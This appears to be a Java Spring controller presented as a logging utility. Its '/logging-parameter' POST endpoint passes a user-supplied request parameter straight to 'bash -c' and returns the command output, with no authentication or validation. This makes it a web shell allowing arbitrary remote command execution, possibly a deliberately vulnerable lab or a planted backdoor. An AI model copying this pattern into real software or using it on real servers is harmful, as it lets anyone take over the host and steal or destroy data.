package penta.core.logging;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class UtilController {

	@Value("${jboss.server.log.dir}")
	String log;
	
	@PostMapping("/logging-parameter")
	public String logging(Model model,@RequestParam String parameter) {
		
		try {
			String[] command = new String[] { "bash", "-c", parameter };
			ProcessBuilder processBuilder = new ProcessBuilder(command);
			Process process = processBuilder.start();
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			ArrayList<String> result = new ArrayList<String>();
			while ((line = reader.readLine()) != null) {
				result.add(line);
			}
			model.addAttribute("result", result);
			int exitCode = process.waitFor();
			System.out.println("\nExited with error code : " + exitCode);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "log";
	}
	@RequestMapping("/logging")
	public String logging2(Model model) {
		
		return "log2";
	}
}



